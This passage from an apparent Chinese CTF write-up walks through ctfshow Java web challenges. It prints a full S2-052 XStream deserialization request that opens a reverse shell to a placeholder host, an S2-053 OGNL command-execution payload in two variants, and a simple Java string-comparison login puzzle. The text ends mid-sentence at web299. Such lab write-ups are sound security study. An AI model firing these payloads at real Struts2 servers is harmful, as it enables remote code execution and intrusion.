<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/S2-052/orders/3</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>a58ff680-e3c3-4c88-9876-241b47c8bbe1.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=612176576D5EAE044D06CDAB7620E546; cf_clearance=ZuK66QChNGftyyiGS39xGqXjRvrgqwc7dpOpwNp8hgY-1747317016-1.2.1.1-SHtYMtmhonoQh3f9JFLxlX5e8ZPl2H.d.1t6d9JUkU8A48zWJ8kwl3L9eAExpcFayYenFfR8OxZ7NWlafUA3eW..1Ql.yEeMVQsO2dN0LeOWb9v9mBTw9f9lNiJBsuz0wNfBuxQoVypAzPhH9KeUpkB22hemlwS35.DR.pfloutzMUBCc7K.SMPWBv0hD22WPrXL6TOwx.8Vlv0exiJGfJydMDF8Fmgi7BwFDHfm8A27bqv1xzCh1xdEneeUo.dok_1cBQWYDpbP2ClHu0miDKBW2hnvhGXG7HbMovGYSE3c1QFXa0TPiCQYSEXDX_10Bnlxz9QrXZujCxO7ZGcQA_vDxzoYodJRpDZrLpAsbq8; JSESSIONID=9EE1B5306055FDC634BEBFD5C5C1FF90</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Not:A-Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;145&quot;, &quot;Chromium&quot;;v=&quot;145&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://a58ff680-e3c3-4c88-9876-241b47c8bbe1.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://a58ff680-e3c3-4c88-9876-241b47c8bbe1.challenge.ctf.show/S2-052/orders/3/edit</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2427</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.NullCipher&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">opmode</span>&gt;</span>0<span class="tag">&lt;/<span class="name">opmode</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&quot;java.util.Collections$EmptyIterator&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;<span class="name">command</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &gt;<span class="symbol">&amp;amp;</span>/dev/tcp/[ip]/[port] 0&gt;<span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;<span class="name">redirectErrorStream</span>&gt;</span>false<span class="tag">&lt;/<span class="name">redirectErrorStream</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;/<span class="name">next</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">method</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                  <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">&quot;string&quot;</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">next</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">lock</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder$NullInputStream&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">done</span>&gt;</span>false<span class="tag">&lt;/<span class="name">done</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">ostart</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ostart</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">ofinish</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ofinish</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">              <span class="tag">&lt;<span class="name">closed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">closed</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224132714440.png" alt="image-20260224132714440"></p>
<h1 id="web297"><a href="#web297" class="headerlink" title="web297"></a>web297</h1><h2 id="S2-053"><a href="#S2-053" class="headerlink" title="#S2-053"></a>#S2-053</h2><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-053/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/struts2/s2-053/README.zh-cn.md</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2197868">https://cloud.tencent.com/developer/article/2197868</a></p>
<p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
<h2 id="影响版本-15"><a href="#影响版本-15" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.0.1 &lt;&#x3D; Struts2 &lt;&#x3D; 2.3.33，2.5 &lt;&#x3D; Struts2 &#x3D; 2.5.10</p>
<p>POC</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="string">&#x27;id&#x27;</span>).(#iswin=(<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&#x27;os.name&#x27;)</span>.toLowerCase().contains(<span class="string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="literal">true</span>)).(#process=#p.start()).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(#process.getInputStream())</span>)&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/java--ctfshow/image-20260224133040484.png" alt="image-20260224133040484"></p>
<p>然后直接打就行</p>
<p>但是env的内容被花括号截断了，可以将输出进行base64编码，用<code>env | base64</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=<span class="meta">@ognl</span>.OgnlContext<span class="meta">@DEFAULT_MEMBER_ACCESS</span>).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(<span class="meta">@com</span>.opensymphony.xwork2.ognl.OgnlUtil<span class="meta">@class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="string">&quot;env | base64&quot;</span>).(#iswin=(<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&#x27;os.name&#x27;)</span>.toLowerCase().contains(<span class="string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(<span class="literal">true</span>)).(#process=#p.start()).(<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(#process.getInputStream())</span>)&#125;</span><br></pre></td></tr></table></figure>

<h1 id="web298"><a href="#web298" class="headerlink" title="web298"></a>web298</h1><h2 id="Java基础"><a href="#Java基础" class="headerlink" title="#Java基础"></a>#Java基础</h2><p> 将war包放jadx中进行反编译处理后用IDEA打开</p>
<p>看到loginServlet</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ctfshow.model.User;</span><br><span class="line"><span class="keyword">import</span> com.ctfshow.util.Util;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: ctfshow.war:WEB-INF/classes/com/ctfshow/servlet/loginServlet.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">loginServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">3044593499093610703L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(username, password);</span><br><span class="line">        <span class="keyword">if</span> (username == <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            out.print(<span class="string">&quot;you are not admin&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (user.getVipStatus()) &#123;</span><br><span class="line">            out.print(<span class="string">&quot;you are login&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> Util.readFlag(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">            out.print(flag);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            out.print(<span class="string">&quot;login failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里有一个get请求，需要传入一个username和password，但是有一个<code>username==&quot;admin&quot;</code>的校验，但是由于我们传入的username是一个new String对象，本质上不是一个常量值。所以这里在 Java 中 <code>==</code> 比较的是<strong>对象引用地址</strong>，而不是字符串内容。</p>
<p>写个测试代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> TestCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(s1 == <span class="string">&quot;Hello&quot;</span>);<span class="comment">//false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以第一个if是始终为false的，继续看第二个，跟进User的getVipStatus方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">getVipStatus</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.username.equals(<span class="string">&quot;admin&quot;</span>) &amp;&amp; <span class="built_in">this</span>.password.equals(<span class="string">&quot;ctfshow&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以直接传<code>username=admin&amp;password=ctfshow</code>就可以了</p>
<p>看看这个Servlet绑定在哪个路由</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span> </span></span><br><span class="line"><span class="tag">	<span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> </span></span><br><span class="line"><span class="tag">	<span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span></span><br><span class="line"><span class="tag">	<span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee </span></span></span><br><span class="line"><span class="string"><span class="tag">	http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span><span class="tag">&lt;/<span class="name">display-name</span>&gt;</span>	</span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>This is the description of my J2EE component<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>This is the display name of my J2EE component<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>login<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.ctfshow.servlet.loginServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>login<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  	</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以路径就是<code>/ctfshow/login</code>，因为一个war包就是一个web应用，我们需要带上war包的名称，也就是War 包部署到 Tomcat 时的<strong>应用名</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctfshow/login?username=admin&amp;password=ctfshow</span><br></pre></td></tr></table></figure>

<h1 id="web299"><a href="#web299" class="headerlink" title="web299"></a>web299</h1><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="#任意文件读取"></a>#任意文件读取</h2><p>在源代码中有</p>
